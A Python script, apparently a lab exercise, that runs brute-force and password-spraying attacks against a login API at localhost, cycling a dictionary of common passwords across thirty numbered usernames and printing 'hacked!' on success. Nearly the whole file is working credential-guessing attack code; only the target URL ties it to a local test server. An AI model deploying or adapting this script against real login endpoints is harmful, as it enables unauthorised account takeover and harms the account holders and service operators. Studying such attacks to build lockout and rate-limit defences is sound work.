import requests
import json
import time



LOCAL_ADDRESS = 'http://localhost:8000'

def load_common_password():
    with open('dictionary_attack.txt') as file:
        dictionary_attack = file.readlines()
    file.close()
    return dictionary_attack


def get():
    response = requests.get(LOCAL_ADDRESS)
    print(f"Status Code: {response.status_code}")
    # Root returns plain text from the Flask server; attempt to parse JSON safely
    try:
        payload = response.json()
        print("JSON response:", payload)
        return payload
    except ValueError:
        print("Non-JSON response:\n", response.text)
        return response.text


def post(username, password):
    data = {
        'username': username,
        'password': password
    }
    # Post to the login endpoint
    url = f"{LOCAL_ADDRESS}/api/login"
    try:
        response = requests.post(url, json=data)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

    print(f"Status Code: {response.status_code}")
    # Only attempt to parse JSON if the response reports JSON
    content_type = response.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            print(response.json())
        except ValueError:
            print("Response said JSON but could not parse it")
    else:
        print(response.text)
    return response.status_code


def brute_force(username):
    common_passwords = load_common_password()
    start_time = time.time()  
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    attempt_count = 0

    for password in common_passwords:
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break

        password = password[:-1]
        print(password, username)
        answer = post(username, password)

        attempt_count += 1 

        if answer == 200:
            return 1
    return 0

def password_sparying(password):
    #repeated code need to fix
    start_time = time.time()  
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    attempt_count = 0

    for i in range(1,31):
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break

        answer = post(f'user{i}', password)

        attempt_count += 1 

        if answer == 200:
            return 1
    return 0

def start_brute_force():
    for i in range(1,31):
        try:
            if brute_force(f'user{i}'):
                print("hacked!")
                break
        except:
            print('error in sending info to the server')

def start_password_spraying():
    common_passwords = load_common_password()
    for password in common_passwords:
        password = password[:-1]
        try:
            if password_sparying(password):
                print("hacked!")
                break
        except:
            print('error in sending info to the server')
        finally:
            time.sleep(3)






def main():
    start_password_spraying()

    
    
        
        




if __name__ == '__main__':
    main()